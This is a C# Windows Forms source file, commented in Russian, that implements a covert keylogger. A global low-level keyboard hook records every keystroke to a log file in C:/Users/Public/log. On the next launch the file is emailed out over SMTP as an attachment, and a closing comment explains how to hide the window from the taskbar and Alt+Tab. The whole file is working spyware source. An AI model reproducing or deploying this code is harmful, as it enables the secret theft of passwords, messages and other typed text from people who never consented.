using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        static string writeTxt;

        public Form1()
        {
            InitializeComponent();
            Hook.SetHook();

            //Отправляем письмо при следующем включений
            if (Directory.Exists("C:/Users/Public/log"))
            {
                SendMail();
            }
        }

        static void SendMail()
        {
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress("mailOut.com", "Tom");
            // кому отправляем
            MailAddress to = new MailAddress("mailIn.com");
            // создаем объект сообщения
            MailMessage m = new MailMessage(from, to);
            // тема письма
            m.Subject = "Тест";
            // текст письма
            m.Body = "<h2>Письмо-тест работы smtp-клиента</h2>";
            // Прикрепляем файл
            m.Attachments.Add(new Attachment("C:/Users/Public/log/log.txt"));
            // письмо представляет код html
            m.IsBodyHtml = true;
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.mail.ru", 587);
            // логин и пароль
            smtp.Credentials = new NetworkCredential("mailOut.com", "password");
            smtp.EnableSsl = true;
            smtp.Send(m);
            m.Dispose(); // Закрываем поток
        }

        class Hook
        {
            [DllImport("user32.dll")]
            static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);

            [DllImport("user32.dll")]
            static extern bool UnhookWindowsHookEx(IntPtr hInstance);

            [DllImport("user32.dll")]
            static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

            [DllImport("kernel32.dll")]
            static extern IntPtr LoadLibrary(string lpFileName);

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            const int WH_KEYBOARD_LL = 13; // Номер глобального LowLevel-хука на клавиатуру
            const int WM_KEYDOWN = 0x100; // Сообщения нажатия клавиши

            private static LowLevelKeyboardProc _proc = hookProc;

            private static IntPtr hhook = IntPtr.Zero;

            public static void SetHook()
            {
                IntPtr hInstance = LoadLibrary("User32");
                hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);

            }

            public static void UnHook()
            {
                UnhookWindowsHookEx(hhook);
            }

            public static IntPtr hookProc(int code, IntPtr wParam, IntPtr lParam)
            {
                if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    //////ОБРАБОТКА НАЖАТИЯ
                    ///

                    //If shift key was pressed, it's not a number.
                    if (Control.ModifierKeys == Keys.Shift)
                    {
                        switch (vkCode)
                        {
                            case 48:
                                writeTxt += ")";
                                break;
                            case 49:
                                writeTxt += "!";
                                break;
                            case 50:
                                writeTxt += "@";
                                break;
                            case 51:
                                writeTxt += "№";
                                break;
                            case 52:
                                writeTxt += ";";
                                break;
                            case 53:
                                writeTxt += "%";
                                break;
                            case 54:
                                writeTxt += ":";
                                break;
                            case 55:
                                writeTxt += "?";
                                break;
                            case 56:
                                writeTxt += "*";
                                break;
                            case 57:
                                writeTxt += "(";
                                break;
                            case 13:
                                writeTxt += "\n";
                                break;
                            case 32:
                                writeTxt += " ";
                                break;
                            case 107:
                                writeTxt += "+";
                                break;
                            case 96:
                                writeTxt += "0";
                                break;
                            case 97:
                                writeTxt += "1";
                                break;
                            case 98:
                                writeTxt += "2";
                                break;
                            case 99:
                                writeTxt += "3";
                                break;
                            case 100:
                                writeTxt += "4";
                                break;
                            case 101:
                                writeTxt += "5";
                                break;
                            case 102:
                                writeTxt += "6";
                                break;
                            case 103:
                                writeTxt += "7";
                                break;
                            case 104:
                                writeTxt += "8";
                                break;
                            case 105:
                                writeTxt += "9";
                                break;
                            default:
                                writeTxt += (Keys)vkCode;
                                break;
                        }

                    }
                    else if (Control.ModifierKeys != Keys.Shift)
                    {
                        switch (vkCode)
                        {
                            case 48:
                                writeTxt += "0";
                                break;
                            case 49:
                                writeTxt += "1";
                                break;
                            case 50:
                                writeTxt += "2";
                                break;
                            case 51:
                                writeTxt += "3";
                                break;
                            case 52:
                                writeTxt += "4";
                                break;
                            case 53:
                                writeTxt += "5";
                                break;
                            case 54:
                                writeTxt += "6";
                                break;
                            case 55:
                                writeTxt += "7";
                                break;
                            case 56:
                                writeTxt += "8";
                                break;
                            case 57:
                                writeTxt += "9";
                                break;
                            case 13:
                                writeTxt += "\n";
                                break;
                            case 32:
                                writeTxt += " ";
                                break;
                            case 107:
                                writeTxt += "+";
                                break;
                            case 96:
                                writeTxt += "0";
                                break;
                            case 97:
                                writeTxt += "1";
                                break;
                            case 98:
                                writeTxt += "2";
                                break;
                            case 99:
                                writeTxt += "3";
                                break;
                            case 100:
                                writeTxt += "4";
                                break;
                            case 101:
                                writeTxt += "5";
                                break;
                            case 102:
                                writeTxt += "6";
                                break;
                            case 103:
                                writeTxt += "7";
                                break;
                            case 104:
                                writeTxt += "8";
                                break;
                            case 105:
                                writeTxt += "9";
                                break;
                            default:
                                writeTxt += (Keys)vkCode;
                                break;
                        }

                    }
                    if (!Directory.Exists("C:/Users/Public/log"))
                    {
                        Directory.CreateDirectory("C:/Users/Public/log");
                    }
                    TextWriter tw = new StreamWriter("C:/Users/Public/log/log.txt");

                    tw.WriteLine(writeTxt);
                    tw.Close();
                    return (IntPtr)0;

                }
                else
                    return CallNextHookEx(hhook, code, (int)wParam, lParam);
            }
        } //Глобальный хук клавы

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}


//Not visible when starting
//Что бы приложение не было видно при запуске:
//
//Opacity = 0% (Прозрачность на 0)
//ShowInTaskbar = false (Выключаем отображение в панели задач)
//FormBorderStyle = false (Выключаем отображение при Alt + Tab)
